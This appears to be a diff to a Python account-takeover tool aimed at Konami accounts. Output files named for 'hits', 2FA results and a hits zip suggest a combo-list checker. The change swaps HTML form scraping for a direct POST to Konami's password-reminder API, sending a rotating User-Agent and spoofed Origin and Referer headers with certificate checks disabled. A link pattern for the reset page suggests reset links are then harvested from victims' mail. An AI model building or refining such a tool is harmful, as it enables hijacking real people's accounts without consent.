@@ -19,7 +19,7 @@ TWOFA_FILE = "2fa.txt"
 BAD_FILE = "bad.txt"
 ZIP_FILE = "konamicombohits.zip"
 
-KONAMI_URL = "https://my.konami.net/en_GB/password-reminder/input-email-address"
+KONAMI_API_URL = "https://my.konami.net/api/password-reminder/sendPasswordRemindEmail"
 KONAMI_LINK_PATTERN = "https://my.konami.net/en_GB/password-reminder/register-password"
 
 tarama_durdur = {}
@@ -266,51 +266,16 @@ class marazali:
         try:
             headers = {
                 "User-Agent": ataturkparki(),
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "Accept-Language": "en-US,en;q=0.9",
+                "Accept": "application/json",
+                "Content-Type": "application/json",
+                "Origin": "https://my.konami.net",
+                "Referer": "https://my.konami.net/en_GB/password-reminder/input-email-address",
             }
-            r = self.s.get(KONAMI_URL, headers=headers, timeout=30, verify=False)
-            if r.status_code != 200:
-                return False
-            
-            action_match = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', r.text, re.IGNORECASE)
-            if action_match:
-                action = action_match.group(1)
-                if action.startswith('/'):
-                    action = f"https://my.konami.net{action}"
-            else:
-                action = KONAMI_URL
-            
-            email_field = None
-            inputs = re.findall(r'<input[^>]*>', r.text)
-            for inp in inputs:
-                name_match = re.search(r'name=["\']([^"\']+)["\']', inp)
-                if name_match:
-                    name = name_match.group(1)
-                    if 'mail' in name.lower() or 'email' in name.lower():
-                        email_field = name
-                        break
-            
-            if not email_field:
-                email_field = 'email'
-            
-            data = {}
-            for inp in inputs:
-                name_match = re.search(r'name=["\']([^"\']+)["\']', inp)
-                value_match = re.search(r'value=["\']([^"\']*)["\']', inp)
-                if name_match:
-                    name = name_match.group(1)
-                    value = value_match.group(1) if value_match else ''
-                    data[name] = value
-            
-            data[email_field] = self.email
-            
-            post_headers = headers.copy()
-            post_headers["Content-Type"] = "application/x-www-form-urlencoded"
-            post_headers["Origin"] = "https://my.konami.net"
-            post_headers["Referer"] = KONAMI_URL
-            
-            r2 = self.s.post(action, data=data, headers=post_headers, timeout=30, verify=False)
+            data = {
+                "locale": "en_GB",
+                "email": self.email
+            }
+            r = self.s.post(KONAMI_API_URL, json=data, headers=headers, timeout=30, verify=False)
             return True
         except:
             return False
